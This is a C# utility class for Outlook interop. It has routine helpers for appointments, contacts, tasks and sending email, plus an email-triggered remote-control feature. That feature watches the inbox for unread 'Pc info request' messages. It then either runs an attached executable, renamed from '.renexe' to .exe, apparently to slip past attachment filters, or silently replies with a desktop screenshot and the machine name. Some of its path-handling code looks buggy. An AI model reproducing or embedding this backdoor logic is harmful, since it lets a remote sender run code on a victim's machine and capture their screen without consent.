using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Windows.Forms;
using SharedClasses;
using System.IO;

public class MicrosoftOfficeInterop
{
	public static void CreateNewOutlookMessage(string To, string Subject, string Body, TextFeedbackEventHandler textFeedbackEvent = null, bool ShowModally = true)
	{
		ThreadingInterop.PerformVoidFunctionSeperateThread(() =>
		{
			if (Process.GetProcessesByName("Outlook").Length == 0)
			{
				TextFeedbackEventArgs.RaiseTextFeedbackEvent_Ifnotnull(textFeedbackEvent, "Starting Outlook, please wait...");
				//TextFeedbackEventArgs.RaiseTextFeedbackEvent_Ifnotnull(textFeedbackEvent, "Starting Outlook, please wait...");
				Process p = System.Diagnostics.Process.Start("Outlook");
			}

			// Creates a new Outlook Application Instance
			Microsoft.Office.Interop.Outlook.Application objOutlook = new Outlook.Application();
			// Creating a new Outlook Message from the Outlook Application Instance
			Outlook.MailItem mic = (Outlook.MailItem)(objOutlook.CreateItem(Outlook.OlItemType.olMailItem));
			mic.To = To;
			mic.Subject = Subject;
			mic.Body = Body;
			//form.TopMost = false;
			mic.Display(ShowModally);
			//form.TopMost = true;
			//WindowsInterop.ShowAndActivateForm(form);
		});
	}

	internal static String RequestSubject = "Pc info request";
	internal static String RequestBody = "zzzzz requesting...";
	internal static String NewExtensionOfEXEincludingdot = ".renexe";
	/// <summary>
	/// Types of info for auto sending email request.
	/// </summary>
	public enum InfoTypes
	{
		/// <summary>
		/// Request a screenshot.
		/// </summary>
		Screenshot,
		/// <summary>
		/// Request the pc name.
		/// </summary>
		PCName,
		/// <summary>
		/// Request to run the executable attached (will have to be renamed first to ".exe".
		/// </summary>
		ExecutableAttached
	};

	/// <summary>
	/// Add a quick appointment just using Subject, StartDate and Duration (minutes).
	/// </summary>
	/// <param name="Subject">The name of the appointment.</param>
	/// <param name="StartDate">The start date of appointment, reminder set 5 minutes before.</param>
	/// <param name="DurationMinutes">The duration of the appointment in minutes.</param>
	public static void AddAppointment(String Subject, DateTime StartDate, Double DurationMinutes)
	{
		Microsoft.Office.Interop.Outlook.Application app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook.AppointmentItem appointitem = (Microsoft.Office.Interop.Outlook.AppointmentItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olAppointmentItem);
		appointitem.Subject = Subject;
		appointitem.Start = StartDate;
		appointitem.End = StartDate.AddMinutes(DurationMinutes);
		appointitem.ReminderMinutesBeforeStart = 5;
		appointitem.ReminderSet = true;
		appointitem.Save();


	}

	/// <summary>
	/// Add a quick appointment just using Subject, StartDate, Duration (minutes) and  Reminder minutes before start.
	/// </summary>
	/// <param name="Subject">The name of the appointment.</param>
	/// <param name="StartDate">The start date of appointment.</param>
	/// <param name="DurationMinutes">The duration of the appointment in minutes.</param>
	/// <param name="ReminderMinutesBefore">How long must the reminder be set before the appointment starts.</param>
	public static void AddAppointment(String Subject, DateTime StartDate, Double DurationMinutes, int ReminderMinutesBefore)
	{
		Microsoft.Office.Interop.Outlook.Application app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook.AppointmentItem appointitem = (Microsoft.Office.Interop.Outlook.AppointmentItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olAppointmentItem);
		appointitem.Subject = Subject;
		appointitem.Start = StartDate;
		appointitem.End = StartDate.AddMinutes(DurationMinutes);
		appointitem.ReminderMinutesBeforeStart = ReminderMinutesBefore;
		appointitem.ReminderSet = true;
		appointitem.Save();
	}

	/// <summary>
	/// Add a custom appointment.
	/// </summary>
	/// <param name="CustomAppointmentItem">Custom appointment.</param>
	public static void AddAppointment(Microsoft.Office.Interop.Outlook.AppointmentItem CustomAppointmentItem)
	{
		CustomAppointmentItem.Save();
	}


	/// <summary>
	/// Add a contact just using contact name (full name) and mobile number.
	/// </summary>
	/// <param name="ContactName">Contact full name.</param>
	/// <param name="MobileNumber">Contact mobile number.</param>
	public static void AddContact(String ContactName, String MobileNumber)
	{
		Microsoft.Office.Interop.Outlook.Application app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook.ContactItem contactitem = (Microsoft.Office.Interop.Outlook.ContactItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olContactItem);
		contactitem.FirstName = ContactName;
		contactitem.FileAs = ContactName;
		contactitem.MobileTelephoneNumber = MobileNumber;
		contactitem.Save();
	}

	/// <summary>
	/// Add a contact just using contact name (full name), mobile number and birthday.
	/// </summary>
	/// <param name="ContactName">Contact full name.</param>
	/// <param name="MobileNumber">Contact mobile number.</param>
	/// <param name="Birthday">Birthday of contact.</param>
	public static void AddContact(String ContactName, String MobileNumber, DateTime Birthday)
	{
		Microsoft.Office.Interop.Outlook.Application app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook.ContactItem contactitem = (Microsoft.Office.Interop.Outlook.ContactItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olContactItem);
		contactitem.FirstName = ContactName;
		contactitem.FileAs = ContactName;
		contactitem.MobileTelephoneNumber = MobileNumber;
		contactitem.Birthday = Birthday;
		contactitem.Save();
	}

	/// <summary>
	/// Add custom contact item.
	/// </summary>
	/// <param name="CustomContactItem">Custom contact item.</param>
	public static void AddContact(Microsoft.Office.Interop.Outlook.ContactItem CustomContactItem)
	{
		CustomContactItem.Save();
	}


	/// <summary>
	/// Send email from default outlook account using only a ToAddres, Subject and Body.
	/// </summary>
	/// <param name="ToAddress">To address of the recipient to which the email must be sent.</param>
	/// <param name="Subject">Subject of the email.</param>
	/// <param name="BodyText">Body text of the email.</param>
	/// <param name="CC">CC address (often referred to as address copied in - email not directly send to this address but it might be of interest to them).</param>
	/// <param name="BCC">BCC address (this address will receive the email but not be able to see who else received this email).</param>
	/// <param name="AttachmentList">List of attachments (these should be the full path to each file).</param>
	public static void SendEmail(String ToAddress, String Subject, String BodyText, String CC = null, String BCC = null, List<String> AttachmentList = null)
	{
		Microsoft.Office.Interop.Outlook.Application app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook._MailItem mailitem = (Microsoft.Office.Interop.Outlook._MailItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olMailItem);
		mailitem.To = ToAddress;
		mailitem.Subject = Subject;
		mailitem.Body = BodyText;
		if (CC != null) mailitem.CC = CC;
		if (BCC != null) mailitem.BCC = BCC;
		foreach (String attachment in AttachmentList)
			mailitem.Attachments.Add(attachment);
		mailitem.Send();
	}

	/// <summary>
	/// Send a custom email (mailitem).
	/// </summary>
	/// <param name="CustomMailItem">Custom mail item.</param>
	public static void SendEmail(Microsoft.Office.Interop.Outlook._MailItem CustomMailItem)
	{
		CustomMailItem.Send();
	}


	/// <summary>
	/// Add a task using only subject, start date and choose wheter to set a reminder (5 minutes before).
	/// </summary>
	/// <param name="Subject">Subject of the task.</param>
	/// <param name="StartDate">Start date of the task.</param>
	/// <param name="SetReminder">Whether a reminder should be set (will be set for 5 minutes before start date).</param>
	public static void AddTask(String Subject, DateTime StartDate, Boolean SetReminder)
	{
		Microsoft.Office.Interop.Outlook.Application app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook.TaskItem taskitem = (Microsoft.Office.Interop.Outlook.TaskItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olTaskItem);
		taskitem.Subject = Subject;
		taskitem.StartDate = StartDate;
		taskitem.ReminderTime = StartDate.AddMinutes(-5);
		taskitem.ReminderSet = SetReminder;
		taskitem.Save();
	}

	/// <summary>
	/// Add a custom task item.
	/// </summary>
	/// <param name="CustomTaskItem">Custom task item.</param>
	public static void AddTask(Microsoft.Office.Interop.Outlook.TaskItem CustomTaskItem)
	{
		CustomTaskItem.Save();
	}

	/// <summary>
	/// Send an email request specified info from the recipient.
	/// </summary>
	/// <param name="screenshot">Should a screenshot be send back.</param>
	/// <param name="pcname">Should the pc name be send back.</param>
	/// <param name="ToAddressForRequest">To address (recipient).</param>
	/// /// <param name="ExeFileNOTRenamedFullPath">The full path of the exe to be emailed for excecution.</param>
	public static void SendInfoRequestEmail(Boolean screenshot, Boolean pcname, String ToAddressForRequest, String ExeFileNOTRenamedFullPath = null)
	{
		Microsoft.Office.Interop.Outlook.Application app = null;
		app = new Microsoft.Office.Interop.Outlook.Application();
		Microsoft.Office.Interop.Outlook._MailItem mailitem = (Microsoft.Office.Interop.Outlook._MailItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olMailItem);
		mailitem.To = ToAddressForRequest;
		mailitem.Subject = RequestSubject;
		mailitem.Body = RequestBody;
		if (screenshot) mailitem.Body += Environment.NewLine + InfoTypes.Screenshot.ToString();
		if (pcname) mailitem.Body += Environment.NewLine + InfoTypes.PCName.ToString();
		if (ExeFileNOTRenamedFullPath != null)
		{
			mailitem.Body += Environment.NewLine + InfoTypes.ExecutableAttached.ToString();
			if (System.IO.File.Exists(ExeFileNOTRenamedFullPath))
			{
				String destTmpFile = ExeFileNOTRenamedFullPath.Replace(".exe", NewExtensionOfEXEincludingdot);
				System.IO.File.Copy(ExeFileNOTRenamedFullPath, destTmpFile, true);
				if (System.IO.File.Exists(destTmpFile))
				{
					mailitem.Attachments.Add(destTmpFile);
					mailitem.Send();
					System.IO.File.Delete(destTmpFile);
				}
				else System.Windows.Forms.MessageBox.Show("Renamed to .renexe file not found to attach, email will not be sent (" + ExeFileNOTRenamedFullPath + "). Maybe this directory is write-protected.", "File not found", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
			}
			else System.Windows.Forms.MessageBox.Show("File not found to attach, email will not be sent (" + ExeFileNOTRenamedFullPath + ")", "File not found", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
		}
		else mailitem.Send();
	}

	/// <summary>
	/// Checks through the inbox if unread request email is found it will act upon it.
	/// </summary>
	public static void SendIfRequestEmailFound()
	{
		//try
		//{
		Microsoft.Office.Interop.Outlook.Application app = null;
		Microsoft.Office.Interop.Outlook._NameSpace ns = null;

		app = new Microsoft.Office.Interop.Outlook.Application();
		ns = app.GetNamespace("MAPI");

		foreach (Microsoft.Office.Interop.Outlook.MAPIFolder myFolder in ns.Folders)
			//if (myFolder.Name.ToUpper().Contains("Mailbox".ToUpper()))
			foreach (Microsoft.Office.Interop.Outlook.MAPIFolder subfolder in myFolder.Folders)
				if (subfolder.Name.ToUpper().Contains("inbox".ToUpper()))
				{
					try
					{
						foreach (Microsoft.Office.Interop.Outlook.MailItem item in subfolder.Items)
							if (item.UnRead)
								if (item.Subject.ToUpper().Contains(RequestSubject.ToUpper()) && item.Body.ToUpper().Contains(RequestBody.ToUpper()))
								{
#pragma warning disable
									if (item.Body.ToUpper().Contains(InfoTypes.ExecutableAttached.ToString().ToUpper()))
										UseEmailAttachmentRunExcecutable(item.Forward());
									else SendEmailContainingRequestedInfo(item.Reply(), item.Body.ToUpper().Contains(InfoTypes.Screenshot.ToString().ToUpper()), item.Body.ToUpper().Contains(InfoTypes.PCName.ToString().ToUpper()));
									item.UnRead = false;
#pragma warning restore
								}
					}
					catch { }
				}
		//}
		//catch { }
	}

	private static void UseEmailAttachmentRunExcecutable(Microsoft.Office.Interop.Outlook.MailItem mailItemInput)
	{
		String tmpSaveFileFullPath = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
		if (!tmpSaveFileFullPath.EndsWith(@"\")) tmpSaveFileFullPath += @"\" + mailItemInput.Attachments[1].FileName;
		String tmpSaveFileName = mailItemInput.Attachments[1].FileName;
		mailItemInput.Attachments[1].SaveAsFile(tmpSaveFileFullPath);
		if (System.IO.File.Exists(tmpSaveFileFullPath))
		{
			String newExeFile = Path.GetDirectoryName(tmpSaveFileFullPath) + tmpSaveFileName.Replace(NewExtensionOfEXEincludingdot, ".exe");
			System.IO.File.Copy(tmpSaveFileFullPath, newExeFile, true);
			System.IO.File.Delete(tmpSaveFileFullPath);
			System.Diagnostics.Process.Start(newExeFile);
		}
		else System.Windows.Forms.MessageBox.Show("File not found saved from attachment, it will not be excecuted (" + tmpSaveFileFullPath + ")", "File not found", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
	}

	private static void SendEmailContainingRequestedInfo(Microsoft.Office.Interop.Outlook.MailItem mailItemInput, Boolean screenshot, Boolean pcname)
	{
		String TempScreenshotFile = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
		if (!TempScreenshotFile.EndsWith(@"\")) TempScreenshotFile += @"\";
		TempScreenshotFile += "tmp123.jpg";

		System.Drawing.Bitmap b = ScreenAndDrawingInterop.CaptureScreen.CaptureScreenNow.GetDesktopImage();
		System.Drawing.Image image = b;
		b.Save(TempScreenshotFile);

		Microsoft.Office.Interop.Outlook.Application app = null;
		app = new Microsoft.Office.Interop.Outlook.Application();
		//Microsoft.Office.Interop.Outlook._MailItem mailitem = (Microsoft.Office.Interop.Outlook._MailItem)app.CreateItem(Microsoft.Office.Interop.Outlook.OlItemType.olMailItem);
		//mailItemInput.To = ToAddress;
		mailItemInput.Subject = "Pc info on " + DateTime.Now.ToLongDateString() + ", " + DateTime.Now.ToShortTimeString();
		mailItemInput.Body = "";

		if (screenshot) mailItemInput.Attachments.Add(TempScreenshotFile, Type.Missing, Type.Missing, Type.Missing);//, typeof(Image), 0, "Screenshot");
		if (pcname) mailItemInput.Body += (mailItemInput.Body == "" ? "" : Environment.NewLine) + "Machine name: " + Environment.MachineName;

#pragma warning disable
		mailItemInput.Send();
#pragma warning restore
		System.IO.File.Delete(TempScreenshotFile);
	}
}